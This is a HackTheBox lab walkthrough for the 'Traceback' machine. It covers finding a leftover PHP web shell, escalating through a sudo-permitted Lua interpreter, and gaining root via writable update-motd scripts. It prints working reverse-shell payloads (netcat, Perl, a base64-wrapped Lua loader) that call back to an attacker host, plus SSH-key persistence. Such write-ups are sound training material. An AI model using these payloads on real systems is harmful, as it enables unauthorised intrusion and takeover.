---
title: "Traceback - HackTheBox"
date: 2020-08-15T18:00:00+02:00
publishDate: 2020-08-15T18:00:00+02:00
tags: [web-shell, perl, reverse-shell, lua]
---

![](/images/hackthebox/traceback/info.png)

Traceback is an easy Linux machine on Hack The Box in which we will take
advantage of a PHP shell left from someone who defaced a website, use it to
escalate to a more privileged user and then take advantage of lax permissions on
`/etc/update-motd.d` to become root. Lets get into it!

## Information gathering
As always, let's start with a quick port scan:
```
$ nmap -A -T4 10.10.10.181
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-22 09:30 EDT
Nmap scan report for 10.10.10.181
Host is up (0.049s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Help us
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Lets take a look at the homepage:
![](/images/hackthebox/traceback/web.png)

Looks like the site got defaced. Reading the source code gives us a hint:
```html
<body>
	<center>
		<h1>This site has been owned</h1>
		<h2>I have left a backdoor for all the net. FREE INTERNETZZZ</h2>
		<h3> - Xh4H - </h3>
		<!--Some of the best web shells that you might need ;)-->
	</center>
</body>
```

Searching for the comment *Some of the best web shells that you might need* on
Google allows us to find a repository called
[Web-Shells](https://github.com/TheBinitGhimire/Web-Shells) that contains a
bunch of PHP web shells.

Lets clone the repository and create a file containing all the filenames:
```
$ git clone https://github.com/TheBinitGhimire/Web-Shells
Cloning into 'Web-Shells'...
remote: Enumerating objects: 76, done.
remote: Total 76 (delta 0), reused 0 (delta 0), pack-reused 76
Unpacking objects: 100% (76/76), 1.85 MiB | 1.74 MiB/s, done.
$ cd Web-Shells/
$ ls *.php > shells.txt
```

Now we can use this list to fuzz the website:
```
$ ffuf -c -r -ac -w shells.txt -u http://10.10.10.181/FUZZ
        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.1.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.181/FUZZ
 :: Follow redirects : true
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response size: 312
 :: Filter           : Response words: 22
 :: Filter           : Response lines: 12
________________________________________________

smevk.php               [Status: 200, Size: 1261, Words: 318, Lines: 59]
:: Progress: [16/16] :: Job [1/1] :: 8 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
```

Looks like we found one! Let's visit the url:
![](/images/hackthebox/traceback/webshell-login.png)

There is a login, let's take a look at the source code of `smevk.php` from the
previously cloned repository:
```php
<?php
/*

SmEvK_PaThAn Shell v3 Coded by Kashif Khan .
https://www.facebook.com/smevkpathan
smevkpathan@gmail.com
Edit Shell according to your choice.
Domain read bypass.
Enjoy!

*/
//Make your setting here.
$deface_url = 'http://pastebin.com/raw.php?i=FHfxsFGT';  //deface url here(pastebin).
$UserName = "admin";                                      //Your UserName here.
$auth_pass = "admin";                                  //Your Password.
//Change Shell Theme here//
$color = "#8B008B";                                   //Fonts color modify here.
$Theme = '#8B008B';                                    //Change border-color accoriding to your choice.
$TabsColor = '#0E5061';                              //Change tabs color here.
#-------------------------------------------------------------------------------

?>
```

And luckily the credentials were not changed:
![](/images/hackthebox/traceback/webshell.png)
This looks straight out of a 90s hacking movie!

## Command execution
We can see from the top of the page that we are logged in as user `webadmin` and
now we have a way to execute commands on the machine. Taking a look around
allows us to find a file called `note.txt` in the user's home so lets read it:
```
$ cat /home/webadmin/note.txt
- sysadmin -
I have left a tool to practice Lua.
I'm sure you know where to find it.
Contact me if you have any question.
```

Some interesting information can be found in `.bash_history`:
```
$ cat .bash_history
ls -la
sudo -l
nano privesc.lua
sudo -u sysadmin /home/sysadmin/luvit privesc.lua
rm privesc.lua
logout
```

Indeed running `sudo -l` tells us that we have the permission to run
`/home/sysadmin/luvit` as the user `sysadmin` without having to enter the
password:
```
$ sudo -l
Matching Defaults entries for webadmin on traceback:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on traceback:
    (sysadmin) NOPASSWD: /home/sysadmin/luvit
```

The bash history file suggests that `luvit` can run a lua file, so lets try to
get a reverse shell as `sysadmin` by running this on the web shell console:
```
$ echo 'os.execute("nc 10.10.14.135 1337 -c /bin/sh")' > /tmp/rev.lua
```

And after setting our netcat listener with `nc -lnvp 1337` lets run it with:
```
$ sudo -u sysadmin /home/sysadmin/luvit /tmp/rev.lua
```
And nothing happens, probably netcat is compiled without `-c` and `-e` options,
so lets try to use Perl instead using the following payload:
```
perl -e 'use Socket;$i="10.10.14.135";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

Because we can only run lua files, we can base64 encode the perl payload so that
we don't have to mess with escaping quotes and write a lua script that will
decode it and in as a system command. Lets create a file called `rev.lua`:
```lua
local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
function dec(data)
    data = string.gsub(data, '[^'..b..'=]', '')
    return (data:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

local encoded_payload = 'cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTAuMTAuMTQuMTM1IjskcD0xMzM3O3NvY2tldChTLFBGX0lORVQsU09DS19TVFJFQU0sZ2V0cHJvdG9ieW5hbWUoInRjcCIpKTtpZihjb25uZWN0KFMsc29ja2FkZHJfaW4oJHAsaW5ldF9hdG9uKCRpKSkpKXtvcGVuKFNURElOLCI+JlMiKTtvcGVuKFNURE9VVCwiPiZTIik7b3BlbihTVERFUlIsIj4mUyIpO2V4ZWMoIi9iaW4vc2ggLWkiKTt9Oyc='
local payload = dec(encoded_payload)
print(payload)
os.execute(payload)
```

After starting a HTTP server with `python -m http.server 1337`, lets use the web
shell console to download the file on the remote machine:
```
wget http://10.10.14.135:1337/rev.lua -O /tmp/rev.lua
```

And after running it again as before we now have a connection on our netcat
listener:
```
$ nc -lnvp 1337
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.10.181.
Ncat: Connection from 10.10.10.181:41144.
/bin/sh: 0: can't access tty; job control turned off
$ whoami
sysadmin
```

Lets use python to get a better shell:
```
python3 -c "import pty; pty.spawn('/bin/bash')"
```

And let's finally get the flag:
```
sysadmin@traceback:~$ wc -c user.txt
33 user.txt
```

## Privilege escalation
First of all, let's create a SSH key with `ssh-keygen` on our machine and lets
add the public key to `/home/sysadmin/.ssh/authorized_keys` and use it to login:
```
$ ssh -i sysadmin sysadmin@10.10.10.181
The authenticity of host '10.10.10.181 (10.10.10.181)' can't be established.
ECDSA key fingerprint is SHA256:7PFVHQKwaybxzyT2EcuSpJvyQcAASWY9E/TlxoqxInU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.181' (ECDSA) to the list of known hosts.
#################################
-------- OWNED BY XH4H  ---------
- I guess stuff could have been configured better ^^ -
#################################

Welcome to Xh4H land



Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Fri Aug 14 11:34:08 2020 from 10.10.14.127
$ bash
sysadmin@traceback:~$
```

Looking at the list of running processes, we can see an interesting one:
```
root       3518  0.0  0.0   4628   780 ?        Ss   07:03   0:00 /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/
```

Basically all the scripts in `/etc/update-motd.d` are executed as root when
logging in with ssh to create the welcome banner. Lets take a look at the
permission of the files:
```
sysadmin@traceback:~ ls -la /etc/update-motd.d
total 32
drwxr-xr-x  2 root sysadmin 4096 Aug 27  2019 .
drwxr-xr-x 80 root root     4096 Mar 16 03:55 ..
-rwxrwxr-x  1 root sysadmin  981 Aug 14 12:51 00-header
-rwxrwxr-x  1 root sysadmin  982 Aug 14 12:51 10-help-text
-rwxrwxr-x  1 root sysadmin 4264 Aug 14 12:51 50-motd-news
-rwxrwxr-x  1 root sysadmin  604 Aug 14 12:51 80-esm
-rwxrwxr-x  1 root sysadmin  299 Aug 14 12:51 91-release-upgrade
```

We can modify them! We can reuse the same lua script that we used before to get
a reverse shell as root by adding it at the end of `00-header`:
```
sysadmin@traceback:~$ echo '/home/sysadmin/luvit /tmp/rev.lua' >> /etc/update-motd.d/00-header
```

And after logging in with ssh, we should get a connection:
```
$ nc -lnvp 1337
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.10.181.
Ncat: Connection from 10.10.10.181:41164.
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
```

And lets get the flag:
```
# wc -c /root/root.txt
33 /root/root.txt
```

Thanks for reading!
